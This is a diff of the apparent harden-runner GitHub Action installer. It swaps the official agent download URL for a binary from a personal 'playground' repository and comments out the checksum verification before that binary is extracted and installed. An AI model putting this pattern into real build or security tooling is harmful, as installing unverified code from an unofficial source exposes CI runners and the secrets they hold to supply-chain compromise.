@@ -85666,15 +85666,11 @@ function installAgent(isTLS, configStr) {
             downloadPath = yield tool_cache.downloadTool(`https://github.com/step-security/agent-ebpf/releases/download/v1.9.0/harden-runner_1.9.0_linux_${variant}.tar.gz`, undefined, auth);
         }
         else {
-            if (variant === "arm64") {
-                console.log(ARM64_RUNNER_MESSAGE);
-                return false;
-            }
-            downloadPath = yield tool_cache.downloadTool("https://github.com/step-security/agent/releases/download/v0.16.2/agent_0.16.2_linux_amd64.tar.gz", undefined, auth);
+            downloadPath = yield tool_cache.downloadTool(`https://github.com/h0x0er/playground/releases/download/v0.0.3/agent_linux_${variant}.tar.gz`, undefined, auth);
         }
-        if (!verifyChecksum(downloadPath, isTLS, variant, "linux")) {
-            return false;
-        }
+        // if (!verifyChecksum(downloadPath, isTLS, variant, "linux")) {
+        //   return false;
+        // }
         const extractPath = yield tool_cache.extractTar(downloadPath);
         let cmd = "cp", args = [external_path_.join(extractPath, "agent"), "/home/agent/agent"];
         external_child_process_.execFileSync(cmd, args);
